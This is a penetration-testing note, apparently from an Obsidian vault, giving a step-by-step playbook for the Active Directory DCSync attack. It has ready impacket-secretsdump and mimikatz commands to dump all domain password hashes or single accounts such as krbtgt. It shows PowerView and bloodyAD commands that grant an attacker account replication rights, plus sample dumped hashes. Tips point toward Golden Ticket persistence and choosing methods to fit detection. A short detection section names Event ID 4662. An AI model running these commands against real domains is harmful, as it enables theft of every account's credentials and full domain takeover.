---
tags: [pentest, dcsync, ad, credentials, active-directory, initial-access, windows]
phase: 5
---
# DCSync

Abuse the DRSUAPI replication protocol to ask a DC for password data of any account. **The cleanest way to extract domain hashes** when you have the right ACL.

[[06 - Gaining Access/00 - README|Folder index]]

## Required rights

The account performing DCSync needs **all three**:

- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`
- `DS-Replication-Get-Changes-In-Filtered-Set` (newer Win versions)

By default, only Domain Admins / Enterprise Admins / Domain Controllers have these. Look for misconfigurations granting them to other principals.

## Find who can DCSync

```bash
# BloodHound query (built-in): "Find users with DCSync rights"

# Or PowerView (Windows)
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match "DS-Replication-Get-Changes" } |
  Select-Object -ExpandProperty SecurityIdentifier | ConvertFrom-Sid
```

## Run

### Pull ALL hashes

```bash
impacket-secretsdump -just-dc corp.local/admin:pass@10.0.0.10
```

### Pull just one user

```bash
impacket-secretsdump -just-dc-user krbtgt corp.local/admin:pass@10.0.0.10
impacket-secretsdump -just-dc-user Administrator corp.local/admin:pass@10.0.0.10
```

### Pull just NTLM hashes (no Kerberos keys, no history)

```bash
impacket-secretsdump -just-dc-ntlm corp.local/admin:pass@10.0.0.10
```

### With NTLM hash (PtH + DCSync)

```bash
impacket-secretsdump -just-dc -hashes :<NTLM> corp.local/admin@10.0.0.10
```

### With Kerberos ticket

```bash
export KRB5CCNAME=/tmp/admin.ccache
impacket-secretsdump -just-dc -k -no-pass corp.local/admin@dc01.corp.local
```

### From Windows (mimikatz)

```text
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

## Output

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
CORP.LOCAL\krbtgt:502:aad3b435...:79e85a3a7c3d...:::
CORP.LOCAL\Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
CORP.LOCAL\alice:1103:aad3b435...:abcdef0123...:::

[*] Kerberos keys grabbed
CORP.LOCAL\krbtgt:aes256-cts-hmac-sha1-96:abcdef...
CORP.LOCAL\krbtgt:aes128-cts-hmac-sha1-96:...
```

## Granting yourself DCSync (when you have WriteDACL on domain root)

PowerView:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity attacker -Rights DCSync
```

Then run DCSync as `attacker`.

bloodyAD:

```bash
bloodyAD --host dc01.corp.local -d corp.local -u attacker -p pass \
  add dcsync attacker
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `DRSGetNCChanges: status_code: 0x00000005 (ACCESS_DENIED)` | Account lacks DCSync rights. Re-check ACL. |
| `KRB_AP_ERR_SKEW` | Sync clock with DC. |
| Truncated output | Big domain - use `-output-file` and pipe to less. |
| Hashes look empty (`aad3b435...:31d6cfe0...`) | That's the EMPTY NTLM hash - account literally has no password. |

## Detection

- Event ID **4662** on DC with `Object Type: %{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (Replicating Directory Changes).
- Audit Policy: `DS Access → Audit Directory Service Replication`.
- Splunk / Microsoft Defender for Identity flag DCSync from non-DC sources.

## Strategic use

- **Always pull krbtgt** when you DCSync - that's your Golden Ticket key.
- **Always pull machine accounts** (`<HOSTNAME>$`) - useful for Silver Tickets.
- **Pull twice if persistence is in scope** - the second pull gives you key versions to compare for `kerberos::golden /ticket`.

> [!tip] DCSync vs offline NTDS
> DCSync is faster, no DC disk artifacts, but generates the 4662 event. Offline NTDS via `ntdsutil ifm` has no DCSync log but leaves shadow-copy / file-access traces. Pick based on detection model.

## See also

- [[14 - secretsdump]]
- [[46 - Golden Ticket]]
- [[49 - DCSync Rights as Persistence]]
